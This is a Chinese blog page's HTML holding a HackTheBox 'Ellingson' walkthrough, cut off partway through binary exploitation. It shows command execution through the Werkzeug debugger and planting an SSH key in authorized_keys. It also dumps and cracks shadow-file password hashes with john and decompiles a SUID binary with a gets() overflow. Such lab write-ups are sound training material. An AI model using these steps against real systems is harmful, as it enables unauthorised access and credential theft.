<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_buildManifest.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Ellingson","contentHtml":"\u003ch1\u003eMachine - Ellingson\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Ellingson\"\u003ehttps://app.hackthebox.com/machines/Ellingson\u003c/a\u003e | \u003ccode\u003eLinux\u003c/code\u003e | \u003ccode\u003eHard\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson nmap -sT -min-rate 5000 10.10.10.139\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.10.139\nHost is up (0.062s latency).\nNot shown: 886 closed tcp ports (conn-refused), 112 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 0.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson nmap -sT -A -p 22,80 10.10.10.139   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.10.139\nHost is up (0.056s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)\n|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e (ECDSA)\n|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n| http-title: Ellingson Mineral Corp\n|_Requested resource was http://10.10.10.139/index\n|_http-server-header: nginx/1.14.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   324.20 ms 10.10.16.1\n2   43.94 ms  10.10.10.139\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 12.57 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e内容告诉我们他们被\u003ccode\u003eEllingson\u003c/code\u003e病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被\u003ccode\u003eban\u003c/code\u003e (目录扫描也不行)\u003c/p\u003e\n\u003cp\u003e得到常见密码，这里可能存在弱密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e Love,Secret,Sex,God\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMargo Wallace\nEugene Belford\nDuke Ellingson\nHal\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e一个一个用户尝试之后没结果\u003c/p\u003e\n\u003ch2\u003eTraceback 命令执行\u003c/h2\u003e\n\u003cp\u003e网页是由\u003ccode\u003eWerkzeug\u003c/code\u003e驱动的，并且异常处理是\u003ccode\u003eTraceback\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e貌似说可以命令执行\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功执行 \u003ccode\u003epy\u003c/code\u003e 语句\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSSH 公钥\u003c/h2\u003e\n\u003cp\u003e反弹 \u003ccode\u003eshell\u003c/code\u003e ，这里怎么弹都没法弹过来\u003c/p\u003e\n\u003cp\u003e我们尝试写公钥\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003e\u003e\u003e import os;\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(os.popen(\u003cspan class=\"hljs-string\"\u003e'whoami'\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e())\nhal\n\n\u003e\u003e\u003e import os;\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(os.popen(\u003cspan class=\"hljs-string\"\u003e'pwd'\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e())\n/\n\n\u003e\u003e\u003e import os;\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(os.popen(\u003cspan class=\"hljs-string\"\u003e'ls -al /home/hal'\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e())\ntotal 36\ndrwxrwx--- 5 hal  hal  4096 Jul 16  2021 .\ndrwxr-xr-x 6 root root 4096 Jul 16  2021 ..\n-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout\n-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc\ndrwx------ 2 hal  hal  4096 Jul 16  2021 .cache\ndrwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg\n-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile\ndrwx------ 2 hal  hal  4096 Jun 13 00:54 .ssh\n-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo\n\n\u003e\u003e\u003e import os;\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(os.popen(\u003cspan class=\"hljs-string\"\u003e'echo \\\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPj1PrDHdIKBOR5DxZjrQD5M3R4yRyMdJqSEDwP6SCfe root@kali\\\" \u003e /home/hal/.ssh/authorized_keys'\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e())\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eCrack Shadow\u003c/h2\u003e\n\u003cp\u003e发现\u003ccode\u003ehal\u003c/code\u003e用户所属有趣的组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehal@ellingson:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1001(hal) gid=1001(hal) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1001(hal),4(adm)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查找 \u003ccode\u003egroup\u003c/code\u003e组有权限的文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现\u003ccode\u003eshadow.bak\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehal@ellingson:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e /var/backups/shadow.bak \nroot:*:17737:0:99999:7:::\ndaemon:*:17737:0:99999:7:::\nbin:*:17737:0:99999:7:::\nsys:*:17737:0:99999:7:::\n\u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e:*:17737:0:99999:7:::\ngames:*:17737:0:99999:7:::\nman:*:17737:0:99999:7:::\nlp:*:17737:0:99999:7:::\nmail:*:17737:0:99999:7:::\nnews:*:17737:0:99999:7:::\nuucp:*:17737:0:99999:7:::\nproxy:*:17737:0:99999:7:::\nwww-data:*:17737:0:99999:7:::\nbackup:*:17737:0:99999:7:::\nlist:*:17737:0:99999:7:::\nirc:*:17737:0:99999:7:::\ngnats:*:17737:0:99999:7:::\nnobody:*:17737:0:99999:7:::\nsystemd-network:*:17737:0:99999:7:::\nsystemd-resolve:*:17737:0:99999:7:::\nsyslog:*:17737:0:99999:7:::\nmessagebus:*:17737:0:99999:7:::\n_apt:*:17737:0:99999:7:::\nlxd:*:17737:0:99999:7:::\nuuidd:*:17737:0:99999:7:::\ndnsmasq:*:17737:0:99999:7:::\nlandscape:*:17737:0:99999:7:::\npollinate:*:17737:0:99999:7:::\nsshd:*:17737:0:99999:7:::\ntheplague:$6$.5ef7Dajxto8Lz3u\u003cspan class=\"hljs-variable\"\u003e$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj\u003c/span\u003e/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::\nhal:$6\u003cspan class=\"hljs-variable\"\u003e$UYTy\u003c/span\u003e.cHj\u003cspan class=\"hljs-variable\"\u003e$qGyl\u003c/span\u003e.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::\nmargo:$6$Lv8rcvK8\u003cspan class=\"hljs-variable\"\u003e$la\u003c/span\u003e/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::\nduke:$6$bFjry0BT\u003cspan class=\"hljs-variable\"\u003e$OtPFpMfL\u003c/span\u003e/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ejohn\u003c/code\u003e破解\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson john --wordlist=/usr/share/wordlists/rockyou.txt \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\npassword123      (theplague)     \niamgod\u003cspan class=\"hljs-variable\"\u003e$08\u003c/span\u003e        (margo)     \n2g 0:01:56:26 DONE (2025-06-13 14:56) 0.000286g/s 2053p/s 3123c/s 3123C/s !!!playboy!!!7..*7¡Vamos!\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show\"\u003c/span\u003e option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e的到两个密码，其中\u003ccode\u003etheplague\u003c/code\u003e的密码是不正确的，\u003ccode\u003emargo\u003c/code\u003e的密码是正确的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Ellingson/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emargo\u003c/code\u003e用户可以拿到\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emargo@ellingson:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \ne6e956999a23f338ffd6d933bf79ca9c\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e缓冲区溢出\u003c/h2\u003e\n\u003ch3\u003e检查程序\u003c/h3\u003e\n\u003cp\u003e这里大致看了一会感觉没什么问题\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emargo@ellingson:~$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/usr/bin/at              \n/usr/bin/newgrp       \n/usr/bin/pkexec           \n/usr/bin/passwd             \n/usr/bin/gpasswd            \n/usr/bin/garbage               \n/usr/bin/newuidmap            \n/usr/bin/sudo                 \n/usr/bin/traceroute6.iputils\n/usr/bin/chfn\n/usr/bin/newgidmap                         \n/usr/bin/chsh                             \n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/bin/su                     \n/bin/umount                 \n/bin/ntfs-3g                   \n/bin/ping                     \n/bin/mount                    \n/bin/fusermount\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是问题出现在\u003ccode\u003egarbage\u003c/code\u003e ，我以为它是\u003ccode\u003egc\u003c/code\u003e（Garbage Collection）\u003c/p\u003e\n\u003cp\u003e运行它的时候，会让你输入密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emargo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拉出去逆向看一眼\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eint __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( !(unsigned int)auth(v4) )\n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(-1);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"[+] W0rM || Control Application\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"[+] ---------------------------\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"Select Option\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"1: Check Balance\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"2: Launch\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"3: Cancel\"\u003c/span\u003e);\n  puts(\u003cspan class=\"hljs-string\"\u003e\"4: Exit\"\u003c/span\u003e);\n  \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( 1 )\n  {\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( 1 )\n    {\n      \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e ( 1 )\n      {\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\u003e \"\u003c/span\u003e);\n        __isoc99_scanf(\u003cspan class=\"hljs-string\"\u003e\"%d%*c\"\u003c/span\u003e, \u0026#x26;v3);\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 != 2 )\n          \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n        launch();\n      }\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 \u003e 2 )\n        \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e;\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 != 3 )\n    {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( v3 == 4 )\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(0);\nLABEL_14:\n      puts(\u003cspan class=\"hljs-string\"\u003e\"Unknown option\"\u003c/span\u003e);\n      \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(-1);\n    }\n    cancel();\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们在开始运行的 \u003ccode\u003eauth\u003c/code\u003e 函数中发现了存在缓冲区溢出漏洞\u003c/p\u003e\n\u003cp\u003e也就是让我们输入密码的地方，会有缓冲区溢出，\u003ccode\u003egets()\u003c/code\u003e 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如\u003ccode\u003e200\u003c/code\u003e个字符），多出来的\u003ccode\u003e100\u003c/code\u003e个字符就会溢出，覆盖掉栈上 \u003ccode\u003es1\u003c/code\u003e 相邻的其他数据。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Enter access password: \"\u003c/span\u003e);\n  gets(s1);\n  putchar(10);\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ( !strcmp(s1, \u003cspan class=\"hljs-string\"\u003e\"N3veRF3@r1iSh3r3!\"\u003c/span\u003e) )\n  {\n    strcpy(dest, \u003cspan class=\"hljs-string\"\u003e\"access granted for user: \"\u003c/span\u003e);\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(\u003cspan class=\"hljs-string\"\u003e\"access granted.\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1LL;\n  }\n  \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n  {\n    puts(\u003cspan class=\"hljs-string\"\u003e\"access denied.\"\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0LL;\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e64\u003c/code\u003e位程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e保护措施情况，开启了\u003ccode\u003eNX\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Ellingson checksec garbage \n[*] Checking \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e new versions of pwntools\n    To \u003cspan 